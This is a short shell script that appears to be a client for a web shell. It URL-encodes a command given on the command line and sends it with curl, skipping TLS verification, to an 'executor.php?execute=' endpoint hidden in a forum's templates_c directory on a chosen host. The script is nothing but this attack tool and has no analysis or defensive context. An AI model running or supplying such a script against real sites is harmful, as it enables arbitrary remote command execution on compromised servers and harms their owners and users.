cmd=`echo "$1" | sed 's/ /%20/g'`
echo $cmd
echo $2
curl -s -k https://$2/forum/templates_c/executor.php?execute=$cmd